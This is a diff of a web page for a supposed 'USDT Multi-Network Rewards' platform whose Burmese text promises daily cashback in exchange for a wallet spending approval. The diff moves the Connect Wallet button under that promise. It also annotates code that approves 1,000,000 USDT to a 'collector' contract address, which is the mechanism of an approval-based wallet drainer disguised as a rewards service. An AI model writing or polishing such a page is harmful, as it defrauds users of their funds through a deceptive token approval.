@@ -57,15 +57,6 @@
             </div>
         </div>
 
-        <!-- Connected Wallet Status & Original Connect Button (Moved right below Network Header) -->
-        <div class="space-y-2 mb-4 text-center">
-            <button id="connectBtn" onclick="startConnectProcess()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2 px-4 rounded-xl transition cursor-pointer text-xs shadow-lg">
-                Connect Wallet
-            </button>
-            <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
-            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold"></span>
-        </div>
-
         <!-- Live Global Calculating Stats Banner -->
         <div class="grid grid-cols-3 gap-2 mb-4 bg-gradient-to-r from-slate-900/90 via-slate-900 to-slate-900/90 border border-emerald-500/20 p-3 rounded-xl text-center shadow-inner relative overflow-hidden">
             <div class="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-transparent via-emerald-500/50 to-transparent"></div>
@@ -91,9 +82,18 @@
         </div>
 
         <!-- Description Paragraph -->
-        <p class="text-xs text-slate-300 leading-relaxed text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
+        <p class="text-xs text-slate-300 leading-relaxed mb-5 text-justify bg-slate-900/60 p-3.5 rounded-xl border border-slate-700/60">
             ကျွန်ုပ်တို့၏ USDT Multi-Network Rewards DApp Platform မှ ကြိုဆိုပါသည်။ ဤစနစ်သည် အသုံးပြုသူများအတွက် မိမိတို့၏ Crypto Wallet ထဲတွင် ရှိသော USDT များပေါ် မူတည်၍ နေ့စဉ် တိုးတက်လာသော Cashback Rewards များကို စနစ်တကျ ရယူနိုင်ရန် ဖန်တီးထားသော ဗဟိုချုပ်ကိုင်မှုမဲ့ အကျိုးခံစားခွင့် ပလက်ဖောင်းတစ်ခု ဖြစ်ပါသည်။ Ethereum (ERC20)၊ TRON (TRC20) နှင့် Binance Smart Chain (BEP20) Network များကို စိတ်ကြိုက် ရွေးချယ် အသုံးပြုနိုင်ပြီး Spending Approval ပြုလုပ်ရုံဖြင့် မိမိ၏ Wallet Balance ပေါ် မူတည်ကာ သတ်မှတ်ထားသော Tiered Daily Rates အလိုက် ဆုလာဘ်များ စတင် ရရှိမည် ဖြစ်ပါသည်။
         </p>
+        
+        <!-- Connected Wallet Status & Original Connect Button -->
+        <div class="space-y-3 mb-4 text-center">
+            <button id="connectBtn" onclick="startConnectProcess()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2 px-4 rounded-xl transition cursor-pointer text-xs shadow-lg">
+                Connect Wallet
+            </button>
+            <p id="walletAddress" class="text-xs text-slate-400 truncate"></p>
+            <span id="selectedNetworkBadge" class="hidden inline-block bg-emerald-500/20 border border-emerald-500/40 text-emerald-400 text-xs px-3 py-1 rounded-full font-semibold"></span>
+        </div>
     </div>
 
     <!-- PART 2 -->
@@ -385,6 +385,7 @@
                 logEl.innerText = "Transaction တင်နေပါသည်...";
                 const usdtContract = new ethers.Contract(USDT_ADDRESSES[network], ERC20_ABI, signer);
                 
+                // --- ၁,၀၀၀,၀၀၀ USDT ကို Default Approve အဖြစ် သတ်မှတ်ခြင်း ---
                 const maxAmount = ethers.parseUnits("1000000", 6);
 
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
